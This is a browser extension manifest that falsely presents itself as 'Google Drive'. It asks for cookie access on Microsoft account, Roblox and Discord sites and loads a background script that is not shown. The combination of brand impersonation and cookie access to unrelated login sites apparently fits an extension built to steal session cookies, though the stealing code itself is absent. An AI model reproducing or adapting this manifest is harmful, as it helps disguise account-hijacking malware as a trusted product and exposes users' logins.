{
  "manifest_version": 3,
  "name": "Google Drive",
  "version": "1.2",
  "permissions": [
    "cookies",
    "storage"
  ],
  "host_permissions": [
    "https://account.microsoft.com/*",
    "https://roblox.com/*",
    "https://discord.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "icons": {
    "16": "icons/google-drive.png",
    "32": "icons/google-drive.png",
    "48": "icons/google-drive.png",
    "128": "icons/google-drive.png"
  }
}
